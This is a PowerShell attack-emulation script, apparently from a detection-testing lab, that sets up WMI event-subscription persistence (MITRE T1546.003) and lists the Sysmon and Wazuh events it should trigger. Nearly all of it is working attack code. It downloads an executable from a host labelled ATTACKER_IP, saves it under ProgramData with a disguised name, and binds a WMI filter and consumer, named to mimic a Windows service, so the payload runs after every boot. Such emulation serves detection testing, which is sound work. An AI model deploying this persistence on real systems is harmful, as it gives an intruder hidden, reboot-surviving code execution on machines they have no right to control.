# =============================================================================
# persist_07_wmi.ps1 -- WMI Event Subscription Persistence
# MITRE ATT&CK: T1546.003 - Event Triggered Execution: WMI Event Subscription
# =============================================================================
# Wazuh Detection:
#   - Sysmon EID 19 (WmiEventFilter activity detected)
#   - Sysmon EID 20 (WmiEventConsumer activity detected)
#   - Sysmon EID 21 (WmiEventConsumerToFilter activity detected)
#   - Wazuh Rule ID: 61636, 61637, 61638
# =============================================================================
# [REQUIRES ADMINISTRATOR PRIVILEGES]
# =============================================================================

param(
    [ValidateSet("install","test","remove")]
    [string]$Action = "install"
)

# ==============================================================================
# CONFIG
# ==============================================================================
$ATTACKER_IP  = "192.168.247.139"
$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_garble.exe"
$PAYLOAD_PATH = "$env:ProgramData\Microsoft\Diagnosis\diaghost.exe"

$WMI_NAME     = "Windows Management Instrumentation Service"

# Filter query: fire when system uptime >= 120s (check every 60s)
$WMI_QUERY    = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"
$WMI_NAMESPACE = "root\subscription"
# ==============================================================================

function Check-Admin {
    $currentPrincipal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Download-Payload {
    if (-not (Test-Path $PAYLOAD_PATH)) {
        Write-Host "[*] Downloading payload from $PAYLOAD_URL ..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PAYLOAD_URL -OutFile $PAYLOAD_PATH -UseBasicParsing -ErrorAction Stop
            Write-Host "[+] Payload saved to: $PAYLOAD_PATH" -ForegroundColor Green
        } catch {
            Write-Warning "[!] Download failed. Creating dummy payload for testing..."
            [System.IO.File]::WriteAllText($PAYLOAD_PATH, "# dummy payload")
        }
    } else {
        Write-Host "[*] Payload already exists at: $PAYLOAD_PATH" -ForegroundColor Cyan
    }
}

function Install-Persistence {
    Write-Host "`n[*] Installing WMI Event Subscription persistence..." -ForegroundColor Cyan
    Write-Host "    Name: $WMI_NAME" -ForegroundColor Gray

    if (-not (Check-Admin)) {
        Write-Error "[!] This technique requires Administrator privileges. Aborting."
        return $false
    }

    Download-Payload

    try {
        # Remove existing WMI objects if present
        Get-WMIObject -Namespace $WMI_NAMESPACE -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $WMI_NAME } | Remove-WMIObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace $WMI_NAMESPACE -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $WMI_NAME } | Remove-WMIObject -ErrorAction SilentlyContinue
        Get-WMIObject -Namespace $WMI_NAMESPACE -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$WMI_NAME*" } | Remove-WMIObject -ErrorAction SilentlyContinue

        # Part 1: EventFilter -- Sysmon EID 19 triggers here
        $FilterArgs = @{
            Name           = $WMI_NAME
            EventNamespace = "root\cimv2"
            QueryLanguage  = "WQL"
            Query          = $WMI_QUERY
        }
        $Filter = Set-WmiInstance -Namespace $WMI_NAMESPACE -Class __EventFilter -Arguments $FilterArgs -ErrorAction Stop
        Write-Host "[+] WMI EventFilter created (Sysmon EID 19)" -ForegroundColor Green

        # Part 2: EventConsumer -- Sysmon EID 20 triggers here
        $ConsumerArgs = @{
            Name             = $WMI_NAME
            CommandLineTemplate = "`"$PAYLOAD_PATH`""
            RunInteractively = $false
        }
        $Consumer = Set-WmiInstance -Namespace $WMI_NAMESPACE -Class CommandLineEventConsumer -Arguments $ConsumerArgs -ErrorAction Stop
        Write-Host "[+] WMI EventConsumer created (Sysmon EID 20)" -ForegroundColor Green

        # Part 3: FilterToConsumerBinding -- Sysmon EID 21 triggers here
        $BindingArgs = @{
            Filter   = $Filter
            Consumer = $Consumer
        }
        Set-WmiInstance -Namespace $WMI_NAMESPACE -Class __FilterToConsumerBinding -Arguments $BindingArgs -ErrorAction Stop | Out-Null
        Write-Host "[+] WMI FilterToConsumerBinding created (Sysmon EID 21)" -ForegroundColor Green

        Write-Host "[+] Persistence installed. Payload will run ~120s after next boot." -ForegroundColor Green
        Write-Host "[!] Trigger: system uptime between 120-180 seconds" -ForegroundColor Yellow
        return $true
    } catch {
        Write-Error "[!] Failed to install WMI persistence: $_"
        return $false
    }
}

function Test-Persistence {
    Write-Host "`n[*] Verifying WMI Event Subscription persistence..." -ForegroundColor Cyan
    $ok = $true

    $filter = Get-WMIObject -Namespace $WMI_NAMESPACE -Class __EventFilter -ErrorAction SilentlyContinue |
              Where-Object { $_.Name -eq $WMI_NAME }
    if ($filter) {
        Write-Host "[+] EventFilter EXISTS: $WMI_NAME" -ForegroundColor Green
        Write-Host "    Query: $($filter.Query)" -ForegroundColor Gray
    } else {
        Write-Host "[-] EventFilter NOT found: $WMI_NAME" -ForegroundColor Red
        $ok = $false
    }

    $consumer = Get-WMIObject -Namespace $WMI_NAMESPACE -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -eq $WMI_NAME }
    if ($consumer) {
        Write-Host "[+] EventConsumer EXISTS: $WMI_NAME" -ForegroundColor Green
        Write-Host "    Command: $($consumer.CommandLineTemplate)" -ForegroundColor Gray
    } else {
        Write-Host "[-] EventConsumer NOT found: $WMI_NAME" -ForegroundColor Red
        $ok = $false
    }

    $binding = Get-WMIObject -Namespace $WMI_NAMESPACE -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
               Where-Object { $_.Filter -like "*$WMI_NAME*" }
    if ($binding) {
        Write-Host "[+] FilterToConsumerBinding EXISTS" -ForegroundColor Green
    } else {
        Write-Host "[-] FilterToConsumerBinding NOT found" -ForegroundColor Red
        $ok = $false
    }

    if (Test-Path $PAYLOAD_PATH) {
        Write-Host "[+] Payload EXISTS: $PAYLOAD_PATH" -ForegroundColor Green
    } else {
        Write-Host "[-] Payload MISSING: $PAYLOAD_PATH" -ForegroundColor Red
        $ok = $false
    }

    if ($ok) { Write-Host "[RESULT] Persistence ACTIVE v" -ForegroundColor Green }
    else      { Write-Host "[RESULT] Persistence INCOMPLETE x" -ForegroundColor Red }
    return $ok
}

function Remove-Persistence {
    Write-Host "`n[*] Removing WMI Event Subscription persistence..." -ForegroundColor Cyan

    $bindings = Get-WMIObject -Namespace $WMI_NAMESPACE -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
                Where-Object { $_.Filter -like "*$WMI_NAME*" }
    if ($bindings) {
        $bindings | Remove-WMIObject -ErrorAction SilentlyContinue
        Write-Host "[+] FilterToConsumerBinding removed" -ForegroundColor Green
    } else { Write-Host "[-] Binding not found (already removed?)" -ForegroundColor Yellow }

    $consumers = Get-WMIObject -Namespace $WMI_NAMESPACE -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
                 Where-Object { $_.Name -eq $WMI_NAME }
    if ($consumers) {
        $consumers | Remove-WMIObject -ErrorAction SilentlyContinue
        Write-Host "[+] EventConsumer removed: $WMI_NAME" -ForegroundColor Green
    } else { Write-Host "[-] Consumer not found (already removed?)" -ForegroundColor Yellow }

    $filters = Get-WMIObject -Namespace $WMI_NAMESPACE -Class __EventFilter -ErrorAction SilentlyContinue |
               Where-Object { $_.Name -eq $WMI_NAME }
    if ($filters) {
        $filters | Remove-WMIObject -ErrorAction SilentlyContinue
        Write-Host "[+] EventFilter removed: $WMI_NAME" -ForegroundColor Green
    } else { Write-Host "[-] Filter not found (already removed?)" -ForegroundColor Yellow }

    if (Test-Path $PAYLOAD_PATH) {
        Remove-Item -Path $PAYLOAD_PATH -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Payload removed: $PAYLOAD_PATH" -ForegroundColor Green
    } else { Write-Host "[-] Payload not found (already removed?)" -ForegroundColor Yellow }

    Write-Host "[+] Cleanup complete." -ForegroundColor Green
}

# ==============================================================================
# Main Logic
# ==============================================================================
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host " persist_07_wmi.ps1 -- T1546.003 WMI Event Subscription" -ForegroundColor Magenta
Write-Host " [REQUIRES ADMINISTRATOR]" -ForegroundColor Red
Write-Host " Wazuh: Sysmon EID 19/20/21 (WMI Event objects)" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta

switch ($Action) {
    "install" { Install-Persistence }
    "test"    { Test-Persistence }
    "remove"  { Remove-Persistence }
}
